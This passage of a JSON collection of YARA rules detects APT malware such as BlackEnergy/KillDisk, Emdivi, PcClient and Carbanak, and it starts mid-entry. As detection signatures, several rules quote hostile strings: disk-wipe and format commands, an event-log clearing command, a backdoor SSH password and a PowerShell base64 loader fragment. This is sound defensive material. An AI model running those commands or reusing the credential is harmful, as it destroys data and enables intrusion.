$ = \"rundll32_exec.dll\\x00Update\"\n        // this is in the encrypted code - shares with 9002 variant\n        //$ = \"POST http://%ls:%d/%x HTTP/1.1\"\n\n    condition:\n       any of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule APT9002Code \n{\n    \n    meta:\n        description = \"9002 code features\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    strings:\n        // start code block\n        $ = { B9 7A 21 00 00 BE ?? ?? ?? ?? 8B F8 ?? ?? ?? F3 A5 }\n        // decryption from other variant with multiple start threads\n        $ = { 8A 14 3E 8A 1C 01 32 DA 88 1C 01 8B 54 3E 04 40 3B C2 72 EC }\n\n    condition:\n        any of them\n}\n\nrule APT9002Strings\n{\n    \n    meta:\n        description = \"9002 Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    strings:\n        $ = \"POST http://%ls:%d/%x HTTP/1.1\"\n        $ = \"%%TEMP%%\\\\%s_p.ax\" wide ascii\n        $ = \"%TEMP%\\\\uid.ax\" wide ascii\n        $ = \"%%TEMP%%\\\\%s.ax\" wide ascii\n        // also triggers on surtr $ = \"mydll.dll\\x00DoWork\"\n        $ = \"sysinfo\\x00sysbin01\"\n        $ = \"\\\\FlashUpdate.exe\"\n\n    condition:\n       any of them\n}\n\nrule APT9002 \n{\n    \n    meta:\n        description = \"9002\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    condition:\n        APT9002Code or APT9002Strings\n}\n\nrule FE_APT_9002\n{\n    \n    meta:\n        Author      = \"FireEye Labs\"\n        Date        = \"2013/11/10\"\n        Description = \"Strings inside\"\n        Reference   = \"Useful link\"\n        \n    strings:\n        $mz = { 4d 5a }\n        $a = \"rat_UnInstall\" wide ascii\n\n    condition:\n        ($mz at 0) and $a\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.\n*/\n\nrule apt_backspace\n{\n\n    meta:\n        description = \"Detects APT backspace\"\n        author = \"Bit Byte Bitten\"\n        date = \"2015-05-14\"\n        hash = \"6cbfeb7526de65eb2e3c848acac05da1e885636d17c1c45c62ad37e44cd84f99\"\n        \n    strings:\n        $s1 = \"!! Use Splice Socket !!\"\n        $s2 = \"User-Agent: SJZJ (compatible; MSIE 6.0; Win32)\"\n        $s3 = \"g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\"\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n*/\nrule APT_bestia\n{\nmeta:\n    author = \"Adam Ziaja <adam@adamziaja.com> http://adamziaja.com\"\n    date = \"2014-03-19\"\n    description = \"Bestia.3.02.012.07 malware used in APT attacks on Polish government\"\n    references = \"http://zaufanatrzeciastrona.pl/post/ukierunkowany-atak-na-pracownikow-polskich-samorzadow/\" /* PL */\n    hash0 = \"9bb03bb5af40d1202378f95a6485fba8\"\n    hash1 = \"7d9a806e0da0b869b10870dd6c7692c5\"\n    maltype = \"apt\"\n    filetype = \"exe\"\nstrings:\n    /* generated with https://github.com/Xen0ph0n/YaraGenerator */\n    $string0 = \"u4(UeK\"\n    $string1 = \"nMiq/'p\"\n    $string2 = \"_9pJMf\"\n    $string3 = \"ICMP.DLL\"\n    $string4 = \"EG}QAp\"\n    $string5 = \"tsjWj:U\"\n    $string6 = \"FileVersion\" wide\n    $string7 = \"O2nQpp\"\n    $string8 = \"2}",
  "APT3102Code": "rule APT3102Code\n{\n\n    meta:\n        description = \"3102 code features\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n\n    strings:\n        $setupthread = { B9 02 07 00 00 BE ?? ?? ?? ?? 8B F8 6A 00 F3 A5 }\n\n    condition:\n        any of them\n}",
  "APT3102Strings": "rule APT3102Strings\n{\n    \n    meta:\n        description = \"3102 Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n\n    strings:\n        $ = \"rundll32_exec.dll\\x00Update\"\n        // this is in the encrypted code - shares with 9002 variant\n        //$ = \"POST http://%ls:%d/%x HTTP/1.1\"\n\n    condition:\n       any of them\n}",
  "APT9002Code": "rule APT9002Code \n{\n    \n    meta:\n        description = \"9002 code features\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    strings:\n        // start code block\n        $ = { B9 7A 21 00 00 BE ?? ?? ?? ?? 8B F8 ?? ?? ?? F3 A5 }\n        // decryption from other variant with multiple start threads\n        $ = { 8A 14 3E 8A 1C 01 32 DA 88 1C 01 8B 54 3E 04 40 3B C2 72 EC }\n\n    condition:\n        any of them\n}",
  "APT9002Strings": "rule APT9002Strings\n{\n    \n    meta:\n        description = \"9002 Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    strings:\n        $ = \"POST http://%ls:%d/%x HTTP/1.1\"\n        $ = \"%%TEMP%%\\\\%s_p.ax\" wide ascii\n        $ = \"%TEMP%\\\\uid.ax\" wide ascii\n        $ = \"%%TEMP%%\\\\%s.ax\" wide ascii\n        // also triggers on surtr $ = \"mydll.dll\\x00DoWork\"\n        $ = \"sysinfo\\x00sysbin01\"\n        $ = \"\\\\FlashUpdate.exe\"\n\n    condition:\n       any of them\n}",
  "APT9002": "rule APT9002 \n{\n    \n    meta:\n        description = \"9002\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    condition:\n        APT9002Code or APT9002Strings\n}",
  "FE_APT_9002": "rule FE_APT_9002\n{\n    \n    meta:\n        Author      = \"FireEye Labs\"\n        Date        = \"2013/11/10\"\n        Description = \"Strings inside\"\n        Reference   = \"Useful link\"\n        \n    strings:\n        $mz = { 4d 5a }\n        $a = \"rat_UnInstall\" wide ascii\n\n    condition:\n        ($mz at 0) and $a\n}",
  "apt_backspace": "rule apt_backspace\n{\n\n    meta:\n        description = \"Detects APT backspace\"\n        author = \"Bit Byte Bitten\"\n        date = \"2015-05-14\"\n        hash = \"6cbfeb7526de65eb2e3c848acac05da1e885636d17c1c45c62ad37e44cd84f99\"\n        \n    strings:\n        $s1 = \"!! Use Splice Socket !!\"\n        $s2 = \"User-Agent: SJZJ (compatible; MSIE 6.0; Win32)\"\n        $s3 = \"g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\"\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}",
  "APT_bestia": "rule APT_bestia\n{\nmeta:\n    author = \"Adam Ziaja <adam@adamziaja.com> http://adamziaja.com\"\n    date = \"2014-03-19\"\n    description = \"Bestia.3.02.012.07 malware used in APT attacks on Polish government\"\n    references = \"http://zaufanatrzeciastrona.pl/post/ukierunkowany-atak-na-pracownikow-polskich-samorzadow/\" /* PL */\n    hash0 = \"9bb03bb5af40d1202378f95a6485fba8\"\n    hash1 = \"7d9a806e0da0b869b10870dd6c7692c5\"\n    maltype = \"apt\"\n    filetype = \"exe\"\nstrings:\n    /* generated with https://github.com/Xen0ph0n/YaraGenerator */\n    $string0 = \"u4(UeK\"\n    $string1 = \"nMiq/'p\"\n    $string2 = \"_9pJMf\"\n    $string3 = \"ICMP.DLL\"\n    $string4 = \"EG}",
  "BlackEnergy_BE_2": "rule BlackEnergy_BE_2 \n{\n   \n   meta:\n      description = \"Detects BlackEnergy 2 Malware\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/DThzLz\"\n      date = \"2015/02/19\"\n      hash = \"983cfcf3aaaeff1ad82eb70f77088ad6ccedee77\"\n   \n   strings:\n      $s0 = \"<description> Windows system utility service  </description>\" fullword ascii\n      $s1 = \"WindowsSysUtility - Unicode\" fullword wide\n      $s2 = \"msiexec.exe\" fullword wide\n      $s3 = \"WinHelpW\" fullword ascii\n      $s4 = \"ReadProcessMemory\" fullword ascii\n   \n   condition:\n      uint16(0) == 0x5a4d and filesize < 250KB and all of ($s*)\n}",
  "BlackEnergy_VBS_Agent": "rule BlackEnergy_VBS_Agent \n{\n\n    meta:\n        description = \"Detects VBS Agent from BlackEnergy Report - file Dropbearrun.vbs\"\n        author = \"Florian Roth\"\n        reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n        date = \"2016-01-03\"\n        hash = \"b90f268b5e7f70af1687d9825c09df15908ad3a6978b328dc88f96143a64af0f\"\n    \n    strings:\n        $s0 = \"WshShell.Run \\\"dropbear.exe -r rsa -d dss -a -p 6789\\\", 0, false\" fullword ascii\n        $s1 = \"WshShell.CurrentDirectory = \\\"C:\\\\WINDOWS\\\\TEMP\\\\Dropbear\\\\\\\"\" fullword ascii\n        $s2 = \"Set WshShell = CreateObject(\\\"WScript.Shell\\\")\" fullword ascii /* Goodware String - occured 1 times */\n   \n    condition:\n        filesize < 1KB and 2 of them\n}",
  "DropBear_SSH_Server": "rule DropBear_SSH_Server\n {\n\n    meta:\n        description = \"Detects DropBear SSH Server (not a threat but used to maintain access)\"\n        author = \"Florian Roth\"\n        reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n        date = \"2016-01-03\"\n        score = 50\n        hash = \"0969daac4adc84ab7b50d4f9ffb16c4e1a07c6dbfc968bd6649497c794a161cd\"\n    \n    strings:\n        $s1 = \"Dropbear server v%s https://matt.ucc.asn.au/dropbear/dropbear.html\" fullword ascii\n        $s2 = \"Badly formatted command= authorized_keys option\" fullword ascii\n        $s3 = \"This Dropbear program does not support '%s' %s algorithm\" fullword ascii\n        $s4 = \"/etc/dropbear/dropbear_dss_host_key\" fullword ascii\n        $s5 = \"/etc/dropbear/dropbear_rsa_host_key\" fullword ascii\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them\n}",
  "BlackEnergy_BackdoorPass_DropBear_SSH": "rule BlackEnergy_BackdoorPass_DropBear_SSH \n{\n    \n    meta:\n        description = \"Detects the password of the backdoored DropBear SSH Server - BlackEnergy\"\n        author = \"Florian Roth\"\n        reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n        date = \"2016-01-03\"\n        hash = \"0969daac4adc84ab7b50d4f9ffb16c4e1a07c6dbfc968bd6649497c794a161cd\"\n    \n    strings:\n        $s1 = \"passDs5Bu9Te7\" fullword ascii\n    \n    condition:\n        uint16(0) == 0x5a4d and $s1\n}",
  "BlackEnergy_KillDisk_1": "rule BlackEnergy_KillDisk_1 \n{\n\n    meta:\n        description = \"Detects KillDisk malware from BlackEnergy\"\n        author = \"Florian Roth\"\n        reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n        date = \"2016-01-03\"\n        score = 80\n        super_rule = 1\n        hash1 = \"11b7b8a7965b52ebb213b023b6772dd2c76c66893fc96a18a9a33c8cf125af80\"\n        hash2 = \"5d2b1abc7c35de73375dd54a4ec5f0b060ca80a1831dac46ad411b4fe4eac4c6\"\n        hash3 = \"c7536ab90621311b526aefd56003ef8e1166168f038307ae960346ce8f75203d\"\n        hash4 = \"f52869474834be5a6b5df7f8f0c46cbc7e9b22fa5cb30bee0f363ec6eb056b95\"\n\n    strings:\n        $s0 = \"system32\\\\cmd.exe\" fullword ascii\n        $s1 = \"system32\\\\icacls.exe\" fullword wide\n        $s2 = \"/c del /F /S /Q %c:\\\\*.*\" fullword ascii\n        $s3 = \"shutdown /r /t %d\" fullword ascii\n        $s4 = \"/C /Q /grant \" fullword wide\n        $s5 = \"%08X.tmp\" fullword ascii\n        $s6 = \"/c format %c: /Y /X /FS:NTFS\" fullword ascii\n        $s7 = \"/c format %c: /Y /Q\" fullword ascii\n        $s8 = \"taskhost.exe\" fullword wide /* Goodware String - occured 1 times */\n        $s9 = \"shutdown.exe\" fullword wide /* Goodware String - occured 1 times */\n \n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and 8 of them\n}",
  "BlackEnergy_KillDisk_2": "rule BlackEnergy_KillDisk_2 \n{\n\n    meta:\n        description = \"Detects KillDisk malware from BlackEnergy\"\n        author = \"Florian Roth\"\n        reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n        date = \"2016-01-03\"\n        score = 80\n        super_rule = 1\n        hash1 = \"11b7b8a7965b52ebb213b023b6772dd2c76c66893fc96a18a9a33c8cf125af80\"\n        hash2 = \"5d2b1abc7c35de73375dd54a4ec5f0b060ca80a1831dac46ad411b4fe4eac4c6\"\n        hash3 = \"f52869474834be5a6b5df7f8f0c46cbc7e9b22fa5cb30bee0f363ec6eb056b95\"\n\n    strings:\n        $s0 = \"%c:\\\\~tmp%08X.tmp\" fullword ascii\n        $s1 = \"%s%08X.tmp\" fullword ascii\n        $s2 = \".exe.sys.drv.doc.docx.xls.xlsx.mdb.ppt.pptx.xml.jpg.jpeg.ini.inf.ttf\" fullword wide\n        $s3 = \"%ls_%ls_%ls_%d.~tmp\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and 3 of them\n}",
  "BlackEnergy_Driver_USBMDM": "rule BlackEnergy_Driver_USBMDM \n{\n\n    meta:\n        description = \"Auto-generated rule - from files 7874a10e551377d50264da5906dc07ec31b173dee18867f88ea556ad70d8f094, b73777469f939c331cbc1c9ad703f973d55851f3ad09282ab5b3546befa5b54a, edb16d3ccd50fc8f0f77d0875bf50a629fa38e5ba1b8eeefd54468df97eba281\"\n        author = \"Florian Roth\"\n        reference = \"http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/\"\n        date = \"2016-01-04\"\n        super_rule = 1\n        hash1 = \"7874a10e551377d50264da5906dc07ec31b173dee18867f88ea556ad70d8f094\"\n        hash2 = \"b73777469f939c331cbc1c9ad703f973d55851f3ad09282ab5b3546befa5b54a\"\n        hash3 = \"edb16d3ccd50fc8f0f77d0875bf50a629fa38e5ba1b8eeefd54468df97eba281\"\n        hash4 = \"ac13b819379855af80ea3499e7fb645f1c96a4a6709792613917df4276c583fc\"\n        hash5 = \"7a393b3eadfc8938cbecf84ca630e56e37d8b3d23e084a12ea5a7955642db291\"\n        hash6 = \"405013e66b6f137f915738e5623228f36c74e362873310c5f2634ca2fda6fbc5\"\n        hash7 = \"244dd8018177ea5a92c70a7be94334fa457c1aab8a1c1ea51580d7da500c3ad5\"\n        hash8 = \"edcd1722fdc2c924382903b7e4580f9b77603110e497393c9947d45d311234bf\"\n    \n    strings:\n        $s1 = \"USB MDM Driver\" fullword wide\n        $s2 = \"KdDebuggerNotPresent\" fullword ascii /* Goodware String - occured 50 times */\n        $s3 = \"KdDebuggerEnabled\" fullword ascii /* Goodware String - occured 69 times */\n    condition:\n        uint16(0) == 0x5a4d and filesize < 180KB and all of them\n}",
  "BlackEnergy_Driver_AMDIDE": "",
  "Emdivi_SFX": "rule Emdivi_SFX\n {\n\n    meta:\n        description = \"Detects Emdivi malware in SFX Archive\"\n        author = \"Florian Roth @Cyber0ps\"\n        reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n        date = \"2015-08-20\"\n        score = 70\n        hash1 = \"7a3c81b2b3c14b9cd913692347019887b607c54152b348d6d3ccd3ecfd406196\"\n        hash2 = \"8c3df4e4549db3ce57fc1f7b1b2dfeedb7ba079f654861ca0b608cbfa1df0f6b\"\n    \n    strings:\n        $x1 = \"Setup=unsecess.exe\" fullword ascii\n        $x2 = \"Setup=leassnp.exe\" fullword ascii\n        $s1 = \"&Enter password for the encrypted file:\" fullword wide\n        $s2 = \";The comment below contains SFX script commands\" fullword ascii\n        $s3 = \"Path=%temp%\" fullword ascii\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 740KB and (1 of ($x*) and all of ($s*))\n}",
  "Emdivi_Gen1": "rule Emdivi_Gen1 \n{\n\n    meta:\n        description = \"Detects Emdivi Malware\"\n        author = \"Florian Roth @Cyber0ps\"\n        reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n        date = \"2015-08-20\"\n        score = 80\n        super_rule = 1\n        hash1 = \"17e646ca2558a65ffe7aa185ba75d5c3a573c041b897355c2721e9a8ca5fee24\"\n        hash2 = \"3553c136b4eba70eec5d80abe44bd7c7c33ab1b65de617dbb7be5025c9cf01f1\"\n        hash3 = \"6a331c4e654dd8ddaa2c69d260aa5f4f76f243df8b5019d62d4db5ae5c965662\"\n        hash4 = \"90d07ea2bb80ed52b007f57d0d9a79430cd50174825c43d5746a16ee4f94ea86\"\n    \n    strings:\n        $x1 = \"wmic nteventlog where filename=\\\"SecEvent\\\" call cleareventlog\" fullword wide\n        $s0 = \"del %Temp%\\\\*.exe %Temp%\\\\*.dll %Temp%\\\\*.bat %Temp%\\\\*.ps1 %Temp%\\\\*.cmd /f /q\" fullword wide\n        $x3 = \"userControl-v80.exe\" fullword ascii\n        $s1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)\" fullword wide\n        $s2 = \"http://www.msftncsi.com\" fullword wide\n        $s3 = \"net use | find /i \\\"c$\\\"\" fullword wide\n        $s4 = \" /del /y & \" fullword wide\n        $s5 = \"\\\\auto.cfg\" fullword wide\n        $s6 = \"/ncsi.txt\" fullword wide\n        $s7 = \"Dcmd /c\" fullword wide\n        $s8 = \"/PROXY\" fullword wide\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and all of them\n}",
  "Emdivi_Gen2": "rule Emdivi_Gen2 \n{\n\n    meta:\n        description = \"Detects Emdivi Malware\"\n        author = \"Florian Roth @Cyber0ps\"\n        reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n        date = \"2015-08-20\"\n        super_rule = 1\n        score = 80\n        hash1 = \"9a351885bf5f6fec466f30021088504d96e9db10309622ed198184294717add1\"\n        hash2 = \"a5be7cb1f37030c9f9211c71e0fbe01dae19ff0e6560c5aab393621f18a7d012\"\n        hash3 = \"9183abb9b639699cd2ad28d375febe1f34c14679b7638d1a79edb49d920524a4\"\n    \n    strings:\n        $s1 = \"%TEMP%\\\\IELogs\\\\\" fullword ascii\n        $s2 = \"MSPUB.EXE\" fullword ascii\n        $s3 = \"%temp%\\\\\" fullword ascii\n        $s4 = \"\\\\NOTEPAD.EXE\" fullword ascii\n        $s5 = \"%4d-%02d-%02d %02d:%02d:%02d \" fullword ascii\n        $s6 = \"INTERNET_OPEN_TYPE_PRECONFIG\" fullword ascii\n        $s7 = \"%4d%02d%02d%02d%02d%02d\" fullword ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 1300KB and 6 of them\n}",
  "Emdivi_Gen3": "rule Emdivi_Gen3 \n{\n\n    meta:\n        description = \"Detects Emdivi Malware\"\n        author = \"Florian Roth @Cyber0ps\"\n        reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n        date = \"2015-08-20\"\n        super_rule = 1\n        score = 80\n        hash1 = \"008f4f14cf64dc9d323b6cb5942da4a99979c4c7d750ec1228d8c8285883771e\"\n        hash2 = \"a94bf485cebeda8e4b74bbe2c0a0567903a13c36b9bf60fab484a9b55207fe0d\"\n  \n    strings:\n        $x1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)\" fullword ascii\n        $s2 = \"\\\\Mozilla\\\\Firefox\\\\Profiles\\\\\" fullword ascii\n        $s4 = \"\\\\auto.cfg\" fullword ascii\n        $s5 = \"/ncsi.txt\" fullword ascii\n        $s6 = \"/en-us/default.aspx\" fullword ascii\n        $s7 = \"cmd /c\" fullword ascii\n        $s9 = \"APPDATA\" fullword ascii /* Goodware String - occured 25 times */\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 850KB and (( $x1 and 1 of ($s*)) or ( 4 of ($s*)))\n}",
  "Emdivi_Gen4": "rule Emdivi_Gen4\n {\n\n    meta:\n        description = \"Detects Emdivi Malware\"\n        author = \"Florian Roth @Cyber0ps\"\n        reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n        date = \"2015-08-20\"\n        super_rule = 1\n        score = 80\n        hash1 = \"008f4f14cf64dc9d323b6cb5942da4a99979c4c7d750ec1228d8c8285883771e\"\n        hash2 = \"17e646ca2558a65ffe7aa185ba75d5c3a573c041b897355c2721e9a8ca5fee24\"\n        hash3 = \"3553c136b4eba70eec5d80abe44bd7c7c33ab1b65de617dbb7be5025c9cf01f1\"\n        hash4 = \"6a331c4e654dd8ddaa2c69d260aa5f4f76f243df8b5019d62d4db5ae5c965662\"\n        hash5 = \"90d07ea2bb80ed52b007f57d0d9a79430cd50174825c43d5746a16ee4f94ea86\"\n        hash6 = \"a94bf485cebeda8e4b74bbe2c0a0567903a13c36b9bf60fab484a9b55207fe0d\"\n  \n    strings:\n        $s1 = \".http_port\\\", \" fullword wide\n        $s2 = \"UserAgent: \" fullword ascii\n        $s3 = \"AUTH FAILED\" fullword ascii\n        $s4 = \"INVALID FILE PATH\" fullword ascii\n        $s5 = \".autoconfig_url\\\", \\\"\" fullword wide\n        $s6 = \"FAILED TO WRITE FILE\" fullword ascii\n        $s7 = \".proxy\" fullword wide\n        $s8 = \"AuthType: \" fullword ascii\n        $s9 = \".no_proxies_on\\\", \\\"\" fullword wide\n  \n    condition:\n        uint16(0) == 0x5a4d and filesize < 853KB and all of them\n}",
  "apt_c16_win_memory_pcclient": "rule apt_c16_win_memory_pcclient\n{\n\n  meta:\n    author = \"@dragonthreatlab\"\n    md5 = \"ec532bbe9d0882d403473102e9724557\"\n    description = \"File matching the md5 above tends to only live in memory, hence the lack of MZ header check.\"\n    date = \"2015/01/11\"\n    reference = \"http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html\"\n\n  strings:\n    $str1 = \"Kill You\" ascii\n    $str2 = \"%4d-%02d-%02d %02d:%02d:%02d\" ascii\n    $str3 = \"%4.2f  KB\" ascii\n    $encodefunc = {8A 08 32 CA 02 CA 88 08 40 4E 75 F4}\n\n  condition:\n    all of them\n}",
  "apt_c16_win_disk_pcclient": "rule apt_c16_win_disk_pcclient\n{\n\n  meta:\n    author = \"@dragonthreatlab\"\n    md5 = \"55f84d88d84c221437cd23cdbc541d2e\"\n    description = \"Encoded version of pcclient found on disk\"\n    date = \"2015/01/11\"\n    reference = \"http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html\"\n\n  strings:\n    $header = {51 5C 96 06 03 06 06 06 0A 06 06 06 FF FF 06 06 BE 06 06 06 06 06 06 06 46 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 EE 06 06 06 10 1F BC 10 06 BA 0D D1 25 BE 05 52 D1 25 5A 6E 6D 73 26 76 74 6F 67 74 65 71 26 63 65 70 70 6F 7A 26 64 69 26 74 79 70 26 6D 70 26 4A 4F 53 26 71 6F 6A 69 30 11 11 0C 2A 06 06 06 06 06 06 06 73 43 96 1B 37 24 00 4E 37 24 00 4E 37 24 00 4E BA 40 F6 4E 39 24 00 4E 5E 41 FA 4E 33 24 00 4E 5E 41 FC 4E 39 24 00 4E 37 24 FF 4E 0D 24 00 4E FA 31 A3 4E 40 24 00 4E DF 41 F9 4E 36 24 00 4E F6 2A FE 4E 38 24 00 4E DF 41 FC 4E 38 24 00 4E 54 6D 63 6E 37 24 00 4E 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 56 49 06 06 52 05 09 06 5D 87 8C 5A 06 06 06 06 06 06 06 06 E6 06 10 25 0B 05 08 06 06 1C 06 06 06 1A 06 06 06 06 06 06 E5 27 06 06 06 16 06 06 06 36 06 06 06 06 06 16 06 16 06 06 06 04 06 06 0A 06 06 06 06 06 06 06 0A 06 06 06 06 06 06 06 06 76 06 06 06 0A 06 06 06 06 06 06 04 06 06 06 06 06 16 06 06 16 06 06}\n\n  condition:\n    $header at 0\n}",
  "apt_c16_win32_dropper": "rule apt_c16_win32_dropper\n{\n\n  meta:\n    author = \"@dragonthreatlab\"\n    md5 = \"ad17eff26994df824be36db246c8fb6a\"\n    description = \"APT malware used to drop PcClient RAT\"\n    date = \"2015/01/11\"\n    reference = \"http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html\"\n\n  strings:\n    $mz = {4D 5A}\n    $str1 = \"clbcaiq.dll\" ascii\n    $str2 = \"profapi_104\" ascii\n    $str3 = \"/ShowWU\" ascii\n    $str4 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\\" ascii\n    $str5 = {8A 08 2A CA 32 CA 88 08 40 4E 75 F4 5E}\n\n  condition:\n    $mz at 0 and all of ($str*)\n}",
  "apt_c16_win_swisyn": "rule apt_c16_win_swisyn\n{\n\n  meta:\n    author = \"@dragonthreatlab\"\n    md5 = \"a6a18c846e5179259eba9de238f67e41\"\n    description = \"File matching the md5 above tends to only live in memory, hence the lack of MZ header check.\"\n    date = \"2015/01/11\"\n    reference = \"http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html\"\n\n  strings:\n    $mz = {4D 5A}\n    $str1 = \"/ShowWU\" ascii\n    $str2 = \"IsWow64Process\"\n    $str3 = \"regsvr32 \"\n    $str4 = {8A 11 2A 55 FC 8B 45 08 88 10 8B 4D 08 8A 11 32 55 FC 8B 45 08 88 10}\n\n  condition:\n    $mz at 0 and all of ($str*)\n}",
  "apt_c16_win_wateringhole": "rule apt_c16_win_wateringhole\n{\n\n  meta:\n    author = \"@dragonthreatlab\"\n    description = \"Detects code from APT wateringhole\"\n    date = \"2015/01/11\"\n    reference = \"http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html\"\n\n  strings:\n    $str1 = \"function runmumaa()\"\n    $str2 = \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"\n    $str3 = \"function MoSaklgEs7(k)\"\n\n  condition:\n    any of ($str*)\n}",
  "apt_c16_win64_dropper": "rule apt_c16_win64_dropper\n{\n\n    meta:\n        author = \"@dragonthreatlab\"\n        date = \"2015/01/11\"\n        description = \"APT malware used to drop PcClient RAT\"\n        reference = \"http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html\"\n\n    strings:\n        $mz = { 4D 5A }\n        $str1 = \"clbcaiq.dll\" ascii\n        $str2 = \"profapi_104\" ascii\n        $str3 = \"\\\\Microsoft\\\\wuauclt\\\\wuauclt.dat\" ascii\n        $str4 = { 0F B6 0A 48 FF C2 80 E9 03 80 F1 03 49 FF C8 88 4A FF 75 EC }\n\n    condition:\n        $mz at 0 and all of ($str*)\n}",
  "Carbanak_0915_1": "rule Carbanak_0915_1\n{\n\n    meta:\n        description = \"Carbanak Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.csis.dk/en/csis/blog/4710/\"\n        date = \"2015-09-03\"\n        score = 70\n\n    strings:\n        $s1 = \"evict1.pdb\" fullword ascii\n        $s2 = \"http://testing.corp 0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 1 of them\n}",
  "Carbanak_0915_2": "rule Carbanak_0915_2\n{\n\n    meta:\n        description = \"Carbanak Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.csis.dk/en/csis/blog/4710/\"\n        date = \"2015-09-03\"\n        score = 70\n\n    strings:\n        $x1 = \"8Rkzy.exe\" fullword wide\n        $s1 = \"Export Template\" fullword wide\n        $s2 = \"Session folder with name '%s' already exists.\" fullword ascii\n        $s3 = \"Show Unconnected Endpoints (Ctrl+U)\" fullword ascii\n        $s4 = \"Close All Documents\" fullword wide\n        $s5 = \"Add &Resource\" fullword ascii\n        $s6 = \"PROCEXPLORER\" fullword wide /* Goodware String - occured 1 times */\n        $s7 = \"AssocQueryKeyA\" fullword ascii /* Goodware String - occured 4 times */\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and ( $x1 or all of ($s*) )\n}",
  "Carbanak_0915_3": "rule Carbanak_0915_3\n{\n\n    meta:\n        description = \"Carbanak Malware\"\n        author = \"Florian Roth\"\n        reference = \"https://www.csis.dk/en/csis/blog/4710/\"\n        date = \"2015-09-03\"\n        score = 70\n\n    strings:\n        $s1 = \"wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\" fullword ascii\n        $s2 = \"SHInvokePrinterCommandA\" fullword ascii\n        $s3 = \"Ycwxnkaj\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and all of them\n}",
  "Careto_SGH": "rule Careto_SGH \n{\n\n    meta:\n        author = \"AlienVault (Alberto Ortega)\"\n        description = \"TheMask / Careto SGH component signature\"\n        reference = \"www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf\"\n        date = \"2014/02/11\"\n\n    strings:\n        $m1 = \"PGPsdkDriver\" ascii wide fullword\n        $m2 = \"jpeg1x32\" ascii wide fullword\n        $m3 = \"SkypeIE6Plugin\" ascii wide fullword\n        $m4 = \"CDllUninstall\" ascii wide fullword\n\n    condition:\n        2 of them\n}",
